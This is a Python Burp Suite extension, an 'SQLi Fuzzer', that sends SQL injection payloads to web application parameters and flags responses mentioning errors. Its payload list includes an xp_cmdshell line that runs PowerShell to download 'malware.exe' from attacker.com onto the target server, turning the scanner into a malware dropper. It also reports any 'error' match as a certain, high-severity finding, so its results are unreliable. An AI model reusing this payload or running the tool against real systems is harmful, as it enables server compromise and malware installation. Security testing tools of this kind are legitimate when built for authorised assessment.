from burp import IBurpExtender, IScannerCheck, IScanIssue
from java.io import PrintWriter
from java.util import ArrayList
import re

class BurpExtender(IBurpExtender, IScannerCheck):

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        callbacks.setExtensionName("SQLi Fuzzer")
        callbacks.registerScannerCheck(self)

    def doPassiveScan(self, baseRequestResponse):
        pass

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        if insertionPoint.getInsertionPointType() == insertionPoint.EXTENSION_PROVIDED:
            # Define payloads for SQL injection fuzzing
            payloads = ["'", "\"", ";", "--", "#", "%", "/*", "*/", "xp_cmdshell", "waitfor delay '0:0:10'", "UNION SELECT 1,2,3",
                        "CAST(0x5f21403264696c656d6d61 AS varchar(8000))", "EXEC master..xp_cmdshell 'powershell.exe -c (New-Object System.Net.WebClient).DownloadFile(''http://attacker.com/malware.exe'',''C:\malware.exe'')'"]

            for payload in payloads:
                # Build a new request with the payload
                payloadRequest = insertionPoint.buildRequest(self._helpers.stringToBytes(payload))

                # Send the payload request
                payloadResponse = self._callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), payloadRequest)

                # Check the response for SQLi vulnerabilities
                if self.checkForSQLi(payload, payloadResponse):
                    return [CustomScanIssue(baseRequestResponse.getHttpService(),
                                            self._helpers.analyzeRequest(baseRequestResponse).getUrl(),
                                            [payloadResponse],
                                            "SQL Injection Vulnerability",
                                            "The response contains SQLi vulnerabilities")]
        return None

    def checkForSQLi(self, payload, response):
        # Implement SQL injection detection techniques
        # Check for SQLi vulnerabilities in the response
        # Return True if the response contains SQLi vulnerabilities, False otherwise
        response_text = self._helpers.bytesToString(response.getResponse())
        regex = re.compile("error|exception", re.IGNORECASE)
        match = regex.search(response_text)

        if match:
            return True
        else:
            return False

class CustomScanIssue(IScanIssue):

    def __init__(self, httpService, url, httpMessages, name, detail):
        self._httpService = httpService
        self._url = url
        self._httpMessages = httpMessages
        self._name = name
        self._detail = detail

    def getUrl(self):
        return self._url

    def getIssueName(self):
        return self._name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return "High"

    def getConfidence(self):
        return "Certain"

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self._detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self._httpMessages

    def getHttpService(self):
        return self._httpService
